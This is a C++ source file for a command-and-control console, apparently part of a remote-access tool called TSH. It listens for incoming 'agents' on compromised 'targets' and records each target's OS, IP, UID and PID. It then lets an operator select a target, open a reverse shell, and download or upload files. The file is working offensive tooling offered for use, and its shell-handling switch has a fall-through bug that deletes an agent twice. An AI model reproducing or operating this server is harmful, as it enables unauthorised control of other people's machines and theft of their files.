#include "CC.h"

#include <sys/select.h>
/* 全局变量、CC成员函数的定义 */

// clang-format off
map<string, int> CC::cmds_ = 
{
    {"help",       0},
    {"ls_target",  1},  
    {"target",     2},
    {"",           3},
    {"cur_target", 4},
    {"error",      5},
};


string              webRoot = "tsh";
map<string, string> URL_
{
    {"FileAPI", webRoot + "/ftp"},
    {"ReverseShellAPI", webRoot + "/rshell"},
};
// clang-format on

/**
 * @brief select one target and access it shell-loop
 * @return the status when exiting the loop
 */
int CC::CC_target_select(int id) {
    if (agentMaps_.size() == 0) {
        std::cout << " no target online\n\n";
        return ERROR;
    } else if (agentMaps_.find(id) == agentMaps_.end()) {
        if (id == -1)
            std::cout << "you haven't selected a target\n\n";
        else
            std::cout << "can't find this target\n\n";
        return ERROR;
    }

    curId_ = id;

    if (agentMaps_[id]->SShClient_ == nullptr) {
        agentMaps_[id]->id_        = id;
        agentMaps_[id]->SShClient_ = std::make_shared<SShClient>(
            this, id, agentMaps_[id]->HttpClient_);
    }

    int retStatus = agentMaps_[id]->SShClient_->start();

    switch (retStatus) {
        case ERROR:
            delAgent(id);
            break;

        case CLOSE:
            delAgent(id);
            break;

        case STOP:
            curId_ = -1;
            break;
    }

    return retStatus;
}

string CC::CC_get_line(int* id) {
    CC_print_linePrompt(*id);
    string cmd;
    getline(std::cin, cmd);

    if (cmd.substr(0, 6) == "target") {
        if (cmd[6] != ' ' || cmd.size() < 8) {
            return "error";
        } else {
            *id = std::stoi(cmd.substr(7));
            return "target";
        }
    }

    if (cmds_.find(cmd) == cmds_.end()) {
        return "error";
    }
    return cmd;
}

void CC::msg_notify(string& msg, bool enter) {
    std::cout << "\n"
              << "\033[5"
              << "\033[33m "
              << " NOTICE: " << msg << "\n"
              << "\033[0m";
     if(enter)
        CC_print_linePrompt(curId_);
}

#if 0
void CC::CC_ftp_start(int id)
{
    if (agentMaps_.size() == 0)
    {
        std::cout << " no target online\n\n";
        return;
    }
    else if (agentMaps_.find(id) == agentMaps_.end())
    {
        if (id == -1)
            std::cout << "you haven't selected a target\n\n";
        else
            std::cout << "can't find this target\n\n";
        return;
    }

    std::cout << "\033[34m"
              << "\033[1m "
              << "TSH_CC/FTP > "
              << "\033[0m"; // 蓝色显示
    std::cout << "\n-------------------------------[FTP]-------------------------------------\n"
              << "                    enter help to view ftpCmd!\n";

    if (agentMaps_[id]->FtpClient_ == nullptr)
    {
        agentMaps_[id]->FtpClient_ = std::make_shared<FtpClient>(agentMaps_[id]->HttpClient_.get());
    }
    agentMaps_[id]->FtpClient_->start();
}
#endif

int CC::CC_rshell_start(int id) {
    if (agentMaps_[id]->SShClient_ == nullptr) {
        agentMaps_[id]->id_        = id;
        agentMaps_[id]->SShClient_ = std::make_shared<SShClient>(
            this, id, agentMaps_[id]->HttpClient_);
    }

    switch (agentMaps_[id]->SShClient_->start()) {
        case ERROR:
            delAgent(id);

        case CLOSE:
            delAgent(id);

        case STOP:
            curId_ = -1;
            break;
    }

    return 1;
}

// clang-format off

// clang-format on

void CC::_start_CC_Listener() {
    threads_.emplace_back([this]() {
        prctl(PR_SET_NAME, "CC_Litener");

        // 开两个port进行监听
        int listenFd1 = utils(ports_[0]);
        int listenFd2 = utils(ports_[1]);

        // int n = listenFd1 > listenFd2 ? listenFd1 : listenFd2;

        fd_set rd;
        FD_ZERO(&rd);
        FD_SET(listenFd1, &rd);
        // FD_SET(listenFd2, &rd);
        // 我不用监听listenFd2
        if (select(listenFd1 + 1, &rd, NULL, NULL, NULL) < 0) {
            perror("select");
            return -1;
        }

        // std::cout << "select就绪"<< "\n";

        if (FD_ISSET(listenFd1, &rd)) {
            // std::cout << "select就绪2"<< "\n";
            struct sockaddr_in clientAddr;
            socklen_t          clientLen = sizeof(clientAddr);
            // while抱住accept
            while (1) {
                int agentFd1 =
                    ::accept(listenFd1, (struct sockaddr*)&clientAddr,
                             (socklen_t*)&clientLen);
                if (agentFd1 == -1) {
                    std::cout << "accept error:" << strerror(errno)
                              << std::endl;
                    break;
                }

                int agentFd2 =
                    ::accept(listenFd2, (struct sockaddr*)&clientAddr,
                             (socklen_t*)&clientLen);
                if (agentFd2 == -1) {
                    std::cout << "accept error:" << strerror(errno)
                              << std::endl;
                    break;
                }

                if (addAgent(agentFd1, agentFd2, &clientAddr) != SUCCESS) {
                    std::cout << "cc_get_agentInfo error\n";
                    continue;
                }
            }
        }
    });
}

int CC::utils(int fd) {
    int listenFd = 0;
    if ((listenFd = ::socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("utils::creatListenFd[%d],socket:%s\n", listenFd,
               strerror(errno));
        return -1;
    }

    int optval = 1;
    if (::setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR,
                     (const void*)&optval, sizeof(int)) == -1) {
        printf("utils::creatListenFd[%d],setsockopt:%s\n", listenFd,
               strerror(errno));
        return -1;
    }

    struct sockaddr_in serverAddr;
    ::bzero(&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons((unsigned short)fd);
    inet_pton(AF_INET, ccIp_.c_str(), &serverAddr.sin_addr.s_addr);
    //  serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    if (::bind(listenFd, (struct sockaddr*)&serverAddr,
               sizeof(serverAddr)) == -1) {
        printf("utils::creatListenFd[%d],bind:%s\n", listenFd,
               strerror(errno));
        return -1;
    }

    if (::listen(listenFd, 200) == -1) {
        printf("utils::creatListenFd[%d],listenFd:%s\n", listenFd,
               strerror(errno));
        return -1;
    }

    return listenFd;
}

/**
 * @brief add a agent
 *        the newAdd-id is bigger than any id
 * @return status
 */
int CC::addAgent(int fd1, int fd2, struct sockaddr_in* clientAddr_) {
    int                            ret = 0;
    std::shared_ptr<AgentResource> agent =
        std::make_shared<AgentResource>();
    agent->HttpClient_  = std::make_shared<HttpResponse>(fd1);
    agent->Information_ = std::make_shared<Information>();

    int Errno;
    while (!agent->HttpClient_->parseFinish()) {
        ret = agent->HttpClient_->read(&Errno);

        if (ret == 0) {
            return CLOSE;
        } else if (ret < 0) {
            return ERROR;
        }
        if (agent->HttpClient_->parseResponse() != HttpResponse::GotAll)
            continue;
    }

    agent->Information_->ip_   = inet_ntoa(clientAddr_->sin_addr);
    agent->Information_->port_ = ntohs(clientAddr_->sin_port);
    agent->Information_->os_   = agent->HttpClient_->getHeader("Sys_Name") +
                               "/" +
                               agent->HttpClient_->getHeader("Sys_Machine");
    agent->Information_->uid_ =
        std::stoi(agent->HttpClient_->getHeader("Cur_Uid"));
    agent->Information_->pid_ =
        std::stoi(agent->HttpClient_->getHeader("Cur_pid"));
    agent->Information_->ccFd   = fd1;
    agent->Information_->fileFd = fd2;

    int tem = agentMaps_.size();
    {
        std::unique_lock<std::mutex> lock(agentsMutex_);
        agentMaps_[tem] = agent;
    }

    string msg = "A target(" + std::to_string(tem) + ") " +
                 agent->Information_->ip_ + " just came online";

    LOG(INFO) << msg;

    msg_notify(msg);
    return SUCCESS;
}

AgentResource* CC::getAgent(int id) {
    return agentMaps_[id].get();
}

/**
 * @brief delete a agent with resource
 *        the last_id needs udata to avoid subsequent agent's id confusion
 */
void CC::delAgent(int id) {
    {
        std::unique_lock<std::mutex> lock(agentsMutex_);
        agentMaps_[id] = (--agentMaps_.end())->second;
        agentMaps_.erase(--agentMaps_.end());
    }

    curId_ = -1;
}

// clang-format off
#include <iomanip>
using std::cout;
using std::endl;
using std::left;
using std::setw;

void CC::CC_help_printf()
{
    std::cout << "\n\033[34m"
              << "\033[1m"
              << "you can use this cmds in any where"
              << "\033[0m"
              << "\n";

    std::cout << "-----------------------------------------------------------------------------------------------\n";
    std::cout << " [     help    ]             print this\n";
    std::cout << " [  ls_target  ]             list agents that online\n";
    std::cout << " [  target id  ]             select one target and return you a shell\n";
    std::cout << " [ cur_target  ]             show current target infomation\n";
    std::cout << " [     stop    ]             stop the current shell to return main console\n";
    std::cout << " [ get [-d] RPF LP ]         download file, \n";
    std::cout << " [ put [-d] LPF RP ]         upload file\n";
    std::cout << " ps:                      R:remote、L:local、P:path F:filename、-d:background、[]:option\n";
    std::cout << "-----------------------------------------------------------------------------------------------\n\n";
}

void CC::CC_target_list()
{
    std::cout << "\n------------------------------------------------------------------------------------------------" << std::endl;
    cout << left << setw(5) << "ID";
    cout << left << setw(30) << "OS";
    cout << left << setw(25) << "HOST";
    cout << left << setw(5) << "UID";
    cout << left << setw(5) << "PID" << endl << endl;

    for (auto &t : agentMaps_)
    {
        cout << left << setw(5) << t.first;
        cout << left << setw(30) << t.second->Information_->os_;
        cout << left << setw(25) << t.second->Information_->ip_ + ":" + std::to_string(t.second->Information_->port_); 
        cout << left << setw(5) << t.second->Information_->uid_;
        cout << left << setw(5) << t.second->Information_->pid_<< endl;
    }
    std::cout << "------------------------------------------------------------------------------------------------\n" << std::endl;
}

void CC::CC_target_current() {
    int id = curId_;

    if (id < 0 || agentMaps_.size() == 0) {
        std::cout << "\nyou haven't selected any taget or no one online\n";
        return;
    }
    
    std::cout << "\n\033[34m"
              << "\033[1m"
              << "current target infomation"
              << "\033[0m"
              << "\n";
              
    std::cout << "\n-----------------------------------------------------------" << std::endl;
    std::cout << "  id: " << id << "\n";
    std::cout << "  OS: " << agentMaps_[id]->Information_->os_ << "\n";
    std::cout << "  IP: " << agentMaps_[id]->Information_->ip_ << ":"
              << agentMaps_[id]->Information_->port_ << "\n";
    std::cout << "  uid: " << agentMaps_[id]->Information_->uid_ << "\n";
    std::cout << "  pid: " << agentMaps_[id]->Information_->pid_ << "\n\n";
    return;
    std::cout << "-------------------------------------------------------------\n" << std::endl;
}

void CC::CC_print_logo() {
    
    std::cout << "\033[32m"<<"\033[1m";

    std::cout << "              @) \\" << std::endl;
    std::cout << " _        ______) \\____________________________________________________________________ "         << std::endl;
    std::cout << "(_)/@8@8{}______   __   _______________________________________________________________>>"         << std::endl;                           
    std::cout << "                ) /  | |_____ __    _  _   _          _   _        _   _                 "         << std::endl;
    std::cout << "              @) /   | ||_ _|| \\\\  | |/ | | |   ____ | | | |  ___ | | | |              "         << std::endl;
    std::cout << "                     | | | | |  \\\\ | || |_| |  /  __|| |_| | / _ \\| | | |             "         << std::endl;
    std::cout << "                     | | |_| | | \\\\  | \\___ |  \\___ \\| | | |\\  __/| | | |_         "         << std::endl;
    std::cout << "                     |_||___||_|  \\\\_| |___/   |____/|_| |_| \\___||___|___|           "         << std::endl << std::endl;

    std::cout << "Version: 0.0.1\n";
    std::cout << "Author: Mr.Liu\n";
    std::cout << "input help to use it\n";

    std::cout << "\033[0m";
    
}

void CC::CC_print_linePrompt(int id) {
    // 立即输出
    std::cout << std::unitbuf;

    if (id < 0) {
        std::cout << "\033[34m"
                  << "\033[1m"
                  << "TSH_CC > "
                  << "\033[0m";
    } 
    else 
    {
        std::cout << "\033[34m" << "\033[1m" << "TSH_CC/";
        std::cout << "\033[31m" << agentMaps_[id]->Information_->ip_ ;
        std::cout << " > " << "\033[0m";
    }
    std::cout << std::nounitbuf;
    return ;
}
// clang-format on
